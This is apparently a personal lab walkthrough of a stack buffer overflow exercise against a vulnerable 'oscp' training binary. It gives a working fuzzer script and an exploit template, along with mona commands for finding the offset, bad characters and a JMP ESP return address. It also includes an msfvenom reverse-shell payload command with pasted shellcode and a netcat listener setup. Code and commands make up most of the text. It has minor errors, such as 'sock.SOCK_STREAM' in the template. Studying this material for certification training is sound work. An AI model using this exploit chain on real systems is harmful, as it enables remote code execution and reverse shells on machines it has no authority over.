Start off the vm. Start the immunity debugger(as administrator), open the oscp binary and run the debugger.
On kali, set a netcat reverse listener nc ip_address 1337

Mona Configuration
The mona script has been pre-installed. I need to set working folder using !mona config -set workingfolder c:\mona\%p
==============================================================================================================
Fuzzing : A template fuzzer script as below; This will return the number of bytes that can crash the program
==============================================================================================================
#!/usr/bin/env python3

import socket, time, sys

ip = "MACHINE_IP"

port = 1337
timeout = 5
prefix = "OVERFLOW1 "

string = prefix + "A" * 100

while True:
    try:
        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
            s.settimeout(timeout)
            s.connect((ip, port))
            s.recv(1024)
            print("Fuzzing with {} bytes".format(len(string) - len(prefix)))
            s.send(bytes(string, "latin-1"))
            s.recv(1024)
    except:
        print("Fuzzing crashed at {} bytes".format(len(string) - len(prefix)))
        sys.exit(0)
    string += 100 * "A"
    time.sleep(1)
==============================================================================================================    
Crash Replication and Controlling EIP. 
With this template we intend to find the offset.
First we generate random characters using /usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 2000
The -l parameter is the value which crashed the program above.
I then enter the generated pattern on the payload section below, rerun immunity debugger and run this exploit
I then run mona script as !mona findmsp -distance 2000
And finally check for offset : EIP contains normal pattern : ... (offset XXXX)
--------------------------------------------------------------------
I now proceed to update the offset value on the script, set the payload to an empty string,
set the retn value to BBBB, rerun immunity debugger and run the script again.
This time, the EIP register gets overwritten with the 4 B's (42424242).
==============================================================================================================
import socket

ip = "MACHINE_IP"
port = 1337

prefix = "OVERFLOW1"
offset = 0
overflow = "A" * offset
retn = ""
padding = ""
payload = ""
postfix = ""

buffer = prefix + overflow + retn + padding + payload + postfix

s = socket.socket(socket.AF_INET, sock.SOCK_STREAM)

try:
    s.connect((ip, port))
    print("Sending evil buffer...")
    s.send(bytes(buffer + "\r\n", "latin-1"))
    print("Done!")
except:
    print("Could not connect.")

==============================================================================================================
Finding Bad Characters => \x00\x07\x2e\xa0
==============================================================================================================
I use the command !mona bytearray -b "\x00" to generate a bytearray and exclude the null byte.

The python script below also works to generate bad chars from \x01 to \xff:
--------------------------------------------
for x in range(1, 256):
  print("\\x" + "{:02x}".format(x), end='')
print()
--------------------------------------------
Next step is to update the exploit.py payload value with the string of bad chars the script generates.
Rerun immunity debugger and run the modified exploit script.
This time taking note of the address to which ESP register points and then use it in the below command
!mona compare -f C:\mona\oscp\bytearray.bin -a <address>
Mona memory comparison results appears. If not, we use the window menu to switch to it. This window shows the results of the comparison, indicating any characters that are different in memory to what they are in the generated bytearay.bin file

All of them are not badchars. Their effect is that sometime badchars cause next byte to get corrupted or affect the rest of the string

We make note of all the badchars. We then generate a new bytearray in mona specifying all the new badchars we have noted along with \x00. Then we proceed to update the exploit.py payload by removing the new badchars as well.

We rerurn immunity debugger and run exploit.py. We repeat badchars comparison until the results status returns "Unmodified" indicating that no more badchars exist.

==============================================================================================================
Finding a Jump Point => ESP
==============================================================================================================
With the debugger running or crashed, we run the command !mona jmp -r esp -cpb "\x00" and include all the badchars identifed above.
This command will find all jmp esp instructions with addresses that won't contain the badchars specified.
We choose an address and update the retn value with this address entered in little endian format (backwards).
Example if the address is \x0A\x01\x02\xAD we enter that as \xAD\x02\x01\x0A

==============================================================================================================
Generating a Payload
==============================================================================================================
We run the msfvenom command and exclude all the badchars as follows:

msfvenom -p windows/shell_reverse_tcp LHOST=YOUR_IP LPORT=4444 EXITFUNC=thread -b "\x00" -f c

We then copy and paste the value of generated c payload into our payload like so:

payload = ("\xfc\xbb\xa1\x8a\x96\xa2\xeb\x0c\x5e\x56\x31\x1e\xad\x01\xc3"
"\x85\xc0\x75\xf7\xc3\xe8\xef\xff\xff\xff\x5d\x62\x14\xa2\x9d"
...
"\xf7\x04\x44\x8d\x88\xf2\x54\xe4\x8d\xbf\xd2\x15\xfc\xd0\xb6"
"\x19\x53\xd0\x92\x19\x53\x2e\x1d")

==============================================================================================================
Prepend NOPs
==============================================================================================================
It is most likely that encoder was used to generate the payload. We will need some space in memory to unpack the payload.
We do this by setting the padding value to 16 or more. "No Operation" denoted as (\x90) bytes.
And the command as:  padding = "\x90" * 16
==============================================================================================================
Final Step - Exploit!
==============================================================================================================
Having set the correct prefix, offset, return address, padding and payload, we can now setup a netcat reverse listener and run the exploit.
===============================================================================================================




